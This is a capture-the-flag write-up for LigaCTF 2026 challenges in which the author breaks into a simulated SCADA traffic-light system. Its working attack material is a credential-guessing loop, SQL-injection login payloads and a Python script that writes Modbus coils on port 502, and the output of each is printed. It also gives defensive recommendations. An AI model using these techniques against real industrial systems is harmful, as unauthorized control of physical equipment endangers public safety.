---
slug: "local-ctf/ligactf2026/plus-i-plus-ii"
event: "ligactf-2026"
title: "PLUS-I & PLUS-II"
summary: "LigaCTF 2026 ISC/SCADA writeup covering weak HMI credentials, Modbus coil control, and traffic-light state manipulation."
date: 2026-06-19
tags:
  - ctf
  - ligactf2026
  - scada
  - ics
  - modbus
  - network
  - web
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
boxImage: "https://owasp.org/www-chapter-kuala-lumpur/owaspmy.jpeg"
---
## Challenge Overview

This challenge was an introduction to **ICS/SCADA security** through a simulated traffic-light control system.

There were two connected challenges:

|Challenge|Objective|Result|
|---|---|---|
|PLUS-I|Log in to the SCADA/HMI portal|Weak/default credential login|
|PLUS-II|Manipulate the traffic-light system using Modbus|All traffic lights set to green, then flag retrieved|

Target:

```bash
http://56.69.47.15:8081/
```

Final flags:

```text
PLUS-I  = OWASPKL{848f38080dc2682b154385d55b9bffe7}
PLUS-II = OWASPKL{ece7f522fa51100848b9da5952bbcef3}
```

---

## Background: What is SCADA?

**SCADA** stands for **Supervisory Control and Data Acquisition**.

In simple terms, SCADA is used to monitor and control physical systems, for example:

- Traffic lights

- Water treatment plants

- Power grids

- Factory machines

- Oil and gas pipelines

- Building automation systems


A normal web application usually controls digital data.
A SCADA system can control **physical process logic**.

That means a security issue in SCADA is more dangerous because the impact may not only be data leakage. It can affect real-world equipment.

---

## Important ICS Terms

## HMI

**HMI** means **Human-Machine Interface**.

It is the screen used by an operator to view and control the industrial system.

In this challenge, the website was the HMI. It displayed a traffic-light system.

## PLC

**PLC** means **Programmable Logic Controller**.

A PLC is a small industrial computer that controls physical devices.

Example:

```text
If coil 2 is ON, turn traffic light 1 green.
If coil 0 is ON, turn traffic light 1 red.
```

## Modbus

**Modbus** is an industrial protocol commonly used by SCADA/PLC systems.

In normal web hacking, we usually interact with:

```text
HTTP / HTTPS
```

In this challenge, after logging in, the important protocol became:

```text
Modbus/TCP
```

Modbus/TCP commonly uses port:

```text
502/tcp
```

## Coil

A **coil** is a Modbus ON/OFF value.

Think of it like a switch:

```text
0 = OFF
1 = ON
```

In this challenge, each traffic-light color was controlled by a coil.

---

## PLUS-I - Login

## 1. Initial Enumeration

I started by requesting the web page:

```bash
BASE="http://56.69.47.15:8081"

curl -i -s "$BASE/" | tee plus1_home.txt

grep -Ei "form|input|name=|method=|action=" plus1_home.txt
```

The server responded with a Python Werkzeug web application:

```text
Server: Werkzeug/3.1.8 Python/3.11.15
```

The page was a fake Malaysian government-style traffic control system called:

```text
SISTEM KAWALAN TRAFIK BERSEPADU (SKTB)
```

The page also leaked several useful details:

```text
SISTEM   : SKTB v2.4
PROTOKOL : MODBUS/TCP
PORT     : 502
UNIT ID  : 0xFF
BUILD    : 20060312
```

This immediately showed that the challenge was related to **industrial control systems**, not just a normal web login.

---

## 2. Login Logic Review

The login page did not use a normal HTML form submission. Instead, the frontend JavaScript sent credentials to:

```text
POST /api/login
```

The JavaScript logic was:

```javascript
const res = await fetch('/api/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: user, password: pass })
});

const data = await res.json();

if (data.success) {
  document.getElementById('flagValue').textContent = data.flag;
}
```

This means the backend returns the flag directly when login is successful.

So the objective was to find valid credentials.

---

## 3. Failed Default Attempt

First, I tested a basic admin credential:

```bash
curl -s -i "$BASE/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
```

Response:

```json
{"message":"Authentication failed","success":false}
```

SQL injection-style login bypasses were also tested but failed:

```bash
for payload in \
"admin'-- -" \
"' OR '1'='1'-- -" \
"' OR 1=1-- -" \
"admin' OR '1'='1'-- -"
do
  curl -s "$BASE/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$payload\",\"password\":\"x\"}"
  echo
done
```

All attempts returned:

```json
{"message":"Authentication failed","success":false}
```

So the intended path was probably not SQL injection.

---

## 4. Credential Guessing from SCADA Clues

The login page leaked two important product hints:

```text
Versi HMI: Citect SCADA
Powered by Vijeo Citect 7.20
```

This suggested trying product-related credentials.

I created a small credential list based on visible words from the page:

```bash
cat > combos.txt <<'EOF'
operator:operator
operator:20060312
operator:2006-03-12
operator:4412
operator:4413
operator:SKTB
operator:sktb
operator:citect
operator:scada
operator:modbus
admin:20060312
admin:citect
admin:scada
citect:[REDACTED_PASSWORD]
citect:20060312
scada:scada
scada:20060312
jpim:jpim
jpim:20060312
WS-CTRL-001:20060312
EOF
```

Then I tested each pair:

```bash
while IFS=: read u p; do
  r=$(curl -s -c c.txt -b c.txt "$BASE/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$u\",\"password\":\"$p\"}")
  echo "$u:$p => $r"
  echo "$r" | grep -q '"success":true' && break
done < combos.txt
```

Successful result:

```json
{
  "flag":"OWASPKL{848f38080dc2682b154385d55b9bffe7}",
  "redirect":"/scada.html",
  "success":true,
  "user":"citect"
}
```

Credentials:

```text
username: citect
password: [REDACTED_PASSWORD]
```

PLUS-I flag:

```text
OWASPKL{848f38080dc2682b154385d55b9bffe7}
```

---

## PLUS-I Root Cause

The issue was **weak/default credentials**.

The application exposed product information, and the credential was based on the SCADA product name:

```text
citect:[REDACTED_PASSWORD]
```

## Security Impact

An attacker who logs in to an HMI may gain visibility or control over the industrial process.

In this challenge, the HMI controlled traffic lights.

In a real environment, this could mean unauthorized control over:

- Pumps

- Valves

- Breakers

- Motors

- Traffic infrastructure

- Factory equipment


## Recommended Fixes

- Remove default credentials.

- Enforce strong password policy.

- Use MFA for operator access.

- Avoid exposing product/version details publicly.

- Restrict HMI access to trusted internal networks.

- Monitor login attempts.

- Lock accounts after repeated failed attempts.


---

## PLUS-II - Modbus Traffic-Light Control

## 1. Accessing the SCADA Panel

After PLUS-I login, the page redirected to:

```text
/scada.html
```

When accessed without a valid session, it redirected back to `/`.

```bash
curl -i -s "$BASE/scada.html" | head -40
```

Response:

```text
HTTP/1.1 302 FOUND
Location: /
```

After logging in and storing the session cookie in `c.txt`, I downloaded the SCADA page:

```bash
curl -s -b c.txt "$BASE/scada.html" -o scada.html
```

Then I searched for useful keywords:

```bash
grep -nEi "fetch|api|login|write|read|coil|modbus|4444|502|flag|OWASPKL" scada.html
```

Important findings:

```text
MODBUS/TCP: 502
SUAPAN DATA: 4444
/api/coils
COIL_DEFS
triggerCar(data.flag)
```

This showed that the web page was reading coil state and waiting for a win condition.

---

## 2. Network Enumeration

I scanned the relevant ports:

```bash
nmap -sV -Pn -p 502,4444,8081 56.69.47.15
```

Result:

```text
PORT     STATE SERVICE
502/tcp  open  mbap?
4444/tcp open  krb524?
8081/tcp open  http    Werkzeug httpd 3.1.8 Python/3.11.15
```

Interpretation:

|Port|Meaning|
|---|---|
|8081|Web HMI|
|502|Modbus/TCP control service|
|4444|Raw Modbus feed/monitor|

Port `502` was the most important because that is where Modbus commands could be sent.

---

## 3. Understanding the Coil Map

Inside `scada.html`, the JavaScript defined the coil table:

```javascript
const COIL_DEFS = [
  { addr: '0x0000', tag: 'IS1_MERAH', device: 'ISYARAT 1' },
  { addr: '0x0001', tag: 'IS1_KUNING', device: 'ISYARAT 1' },
  { addr: '0x0002', tag: 'IS1_HIJAU', device: 'ISYARAT 1' },
  { addr: '0x0003', tag: 'IS2_MERAH', device: 'ISYARAT 2' },
  { addr: '0x0004', tag: 'IS2_KUNING', device: 'ISYARAT 2' },
  { addr: '0x0005', tag: 'IS2_HIJAU', device: 'ISYARAT 2' },
  { addr: '0x0006', tag: 'IS3_MERAH', device: 'ISYARAT 3' },
  { addr: '0x0007', tag: 'IS3_KUNING', device: 'ISYARAT 3' },
  { addr: '0x0008', tag: 'IS3_HIJAU', device: 'ISYARAT 3' },
];
```

Translated:

|Coil|Device|Color|
|---|---|---|
|0x0000|Traffic Light 1|Red|
|0x0001|Traffic Light 1|Yellow|
|0x0002|Traffic Light 1|Green|
|0x0003|Traffic Light 2|Red|
|0x0004|Traffic Light 2|Yellow|
|0x0005|Traffic Light 2|Green|
|0x0006|Traffic Light 3|Red|
|0x0007|Traffic Light 3|Yellow|
|0x0008|Traffic Light 3|Green|

The win condition was clear:

```text
All three traffic lights must be green.
```

So the target coil state was:

```text
Coil 0x0002 = ON
Coil 0x0005 = ON
Coil 0x0008 = ON
All other coils = OFF
```

---

## 4. Modbus Function Codes Used

The challenge hinted at Modbus function codes.

The important ones were:

|Function Code|Name|Purpose|
|---|---|---|
|FC01|Read Coils|Check ON/OFF coil state|
|FC03|Read Holding Registers|Read register data; used to retrieve flag|
|FC05|Write Single Coil|Turn a coil ON/OFF|

In this challenge:

- FC05 was used to change traffic-light states.

- FC01 was used to verify coil state.

- FC03 was used to retrieve the flag after solving the traffic-light logic.


---

## 5. First Mistake: New Connection Per Write

My first approach used `nc` and opened a new TCP connection for every coil write.

Example:

```bash
write_coil () {
  addr=$1
  val=$2
  if [ "$val" = "1" ]; then v="ff00"; else v="0000"; fi
  tid=$(printf "%04x" $((addr+1)))
  frame="${tid}00000006ff05$(printf "%04x" "$addr")${v}"
  echo "$frame" | xxd -r -p | nc -w1 $HOST $PORT | xxd -p
}
```

The writes appeared to be accepted, but the web API still showed the default red state:

```json
{
  "coils": [
    true,
    false,
    false,
    true,
    false,
    false,
    true,
    false,
    false
  ],
  "win": false
}
```

This meant:

```text
Traffic Light 1 = Red
Traffic Light 2 = Red
Traffic Light 3 = Red
```

The problem was not the coil address.

The problem was the TCP session.

The Modbus server stored coil state per TCP connection.
By opening a new socket for every write, the process state did not persist into the final read.

In simple terms:

```text
Wrong:
connect -> write coil 0 -> disconnect
connect -> write coil 1 -> disconnect
connect -> write coil 2 -> disconnect

Correct:
connect once -> write all coils -> read result -> retrieve flag
```

---

## 6. Final Exploit Script

The final script kept one socket open, then:

1. Turned all coils OFF.

2. Turned green coils ON.

3. Read coils using FC01.

4. Read holding registers using FC03.

5. Searched the response for the flag.


```python
import socket
import struct
import re
import time

HOST = "56.69.47.15"
PORT = 502
UNIT = 0xff

tid = 1
s = socket.create_connection((HOST, PORT), timeout=3)

def mb(pdu):
    global tid
    pkt = struct.pack(">HHHB", tid, 0, len(pdu) + 1, UNIT) + pdu
    tid += 1
    s.sendall(pkt)
    return s.recv(4096)

def fc05(addr, on):
    val = 0xff00 if on else 0
    r = mb(struct.pack(">BHH", 5, addr, val))
    print(f"FC05 addr={addr} val={on} -> {r.hex()}")

def fc01():
    r = mb(struct.pack(">BHH", 1, 0, 9))
    print("FC01:", r.hex())

def fc03(start, count):
    r = mb(struct.pack(">BHH", 3, start, count))
    return r

# Turn all coils OFF first
for a in range(9):
    fc05(a, False)

# Turn all green lights ON
for a in [2, 5, 8]:
    fc05(a, True)

# Verify coil state
fc01()
time.sleep(0.2)

# Read holding registers and search for flag
for start in range(0, 65536, 50):
    r = fc03(start, 50)
    data = r[9:] if len(r) > 9 and r[7] == 3 else b""
    raw = data.replace(b"\x00", b"")
    txt = raw.decode("latin1", "ignore")

    m = re.search(r"OWASPKL\{[^}]+\}", txt)
    if m:
        print("FLAG:", m.group(0))
        break

s.close()
```

---

## 7. Successful Output

The script successfully wrote the green coil state:

```text
FC05 addr=0 val=False -> 000100000006ff0500000000
FC05 addr=1 val=False -> 000200000006ff0500010000
FC05 addr=2 val=False -> 000300000006ff0500020000
FC05 addr=3 val=False -> 000400000006ff0500030000
FC05 addr=4 val=False -> 000500000006ff0500040000
FC05 addr=5 val=False -> 000600000006ff0500050000
FC05 addr=6 val=False -> 000700000006ff0500060000
FC05 addr=7 val=False -> 000800000006ff0500070000
FC05 addr=8 val=False -> 000900000006ff0500080000
FC05 addr=2 val=True  -> 000a00000006ff050002ff00
FC05 addr=5 val=True  -> 000b00000006ff050005ff00
FC05 addr=8 val=True  -> 000c00000006ff050008ff00
```

Then FC01 returned:

```text
FC01: 000d00000005ff01022401
```

The important part is:

```text
24 01
```

This represented the coil state where coils `2`, `5`, and `8` were ON.

Then FC03 returned the flag:

```text
FLAG: OWASPKL{ece7f522fa51100848b9da5952bbcef3}
```

PLUS-II flag:

```text
OWASPKL{ece7f522fa51100848b9da5952bbcef3}
```

---

## Modbus Packet Explanation

A Modbus/TCP packet has two main parts:

```text
MBAP Header + PDU
```

## MBAP Header

The MBAP header identifies the Modbus transaction.

Fields:

|Field|Meaning|
|---|---|
|Transaction ID|Tracks request/response|
|Protocol ID|Always 0 for Modbus|
|Length|Length of remaining data|
|Unit ID|Target device ID|

In the script:

```python
pkt = struct.pack(">HHHB", tid, 0, len(pdu) + 1, UNIT) + pdu
```

This builds:

```text
Transaction ID
Protocol ID
Length
Unit ID
PDU
```

## FC05 Write Single Coil

This part writes one coil:

```python
struct.pack(">BHH", 5, addr, val)
```

Meaning:

```text
5    = Function Code 05
addr = Coil address
val  = 0xff00 for ON, 0x0000 for OFF
```

Example:

```text
FC05 addr=2 val=True
```

Means:

```text
Turn coil 2 ON
```

Since coil 2 is `IS1_HIJAU`, this turns traffic light 1 green.

---

## Attack Chain Summary

## PLUS-I

```text
Recon -> Source review -> Product hint found -> Weak credential guessed -> Login success
```

## PLUS-II

```text
Authenticated SCADA access -> Source review -> Coil map found -> Modbus port confirmed -> FC05 coil writes -> FC01 verification -> FC03 flag read
```

---

## Security Findings

## 1. Information Disclosure

The frontend exposed too much information:

```text
Citect SCADA
Vijeo Citect 7.20
MODBUS/TCP
Port 502
Unit ID 0xFF
Coil map
/api/coils
```

This helped identify both the login path and the process-control path.

## 2. Weak Credentials

The login accepted:

```text
citect:[REDACTED_PASSWORD]
```

This is a weak credential pattern based on product naming.

## 3. Exposed Modbus/TCP

Modbus/TCP was reachable directly on port 502.

In a real ICS environment, this is dangerous because Modbus does not provide strong built-in authentication or encryption by default.

If an attacker can reach the Modbus service, they may be able to read or write process values.

## 4. Unauthorized Process Manipulation

Using FC05, it was possible to directly modify traffic-light coil values.

This means the backend allowed direct process-control actions without proper authorization enforcement.

## 5. Frontend Logic Disclosure

The JavaScript revealed how the system determined the win state.

It exposed the relationship between coil index and traffic-light color:

```text
b     = red
b + 1 = yellow
b + 2 = green
```

In real applications, critical process logic should not rely on exposed frontend logic.

---

## Real-World Defensive Recommendations

## Network Segmentation

Modbus/TCP should not be exposed to the public internet.

A safer setup:

```text
Internet
   |
Firewall / VPN
   |
DMZ
   |
SCADA network
   |
PLC network
```

Only trusted engineering workstations should reach port 502.

## Access Control

- Disable default credentials.

- Enforce strong passwords.

- Require MFA for HMI login.

- Use role-based access control.

- Separate viewer/operator/engineer privileges.


## Protocol Security

Modbus traffic should be restricted because legacy Modbus has limited security controls.

Recommended protections:

- Firewall allowlisting

- VPN access

- Jump host

- ICS-aware IDS

- Deep packet inspection for Modbus function codes

- Alerting on dangerous writes such as FC05, FC06, FC15, FC16


## Monitoring

Monitor for suspicious Modbus operations:

```text
FC01 = Read Coils
FC03 = Read Holding Registers
FC05 = Write Single Coil
FC15 = Write Multiple Coils
```

Write operations should be treated as higher risk than read operations.

Example detection idea:

```text
Alert when a non-engineering workstation sends FC05 to a PLC.
```

## Hardening

- Hide product/version banners.

- Remove unnecessary ports.

- Disable unused Modbus functions.

- Restrict write operations.

- Log all operator actions.

- Separate HMI authentication from PLC-level control.

- Validate process state transitions server-side.


---

## Key Takeaways

1. SCADA systems control physical processes, not just web data.

2. HMI access can lead to process-control access.

3. Modbus coils are simple ON/OFF control bits.

4. Modbus function codes define what action is performed.

5. FC05 can modify industrial process state.

6. Port 502 exposure is a major ICS security risk.

7. Weak/default credentials are still dangerous in OT environments.

8. Source code and frontend JavaScript can leak process logic.

9. In this challenge, keeping the same TCP connection was required because state was connection-based.

10. The final objective was to set traffic-light coils `2`, `5`, and `8` to ON, making all lights green.


---

## Final Flags

```text
PLUS-I:
OWASPKL{848f38080dc2682b154385d55b9bffe7}

PLUS-II:
OWASPKL{ece7f522fa51100848b9da5952bbcef3}
```
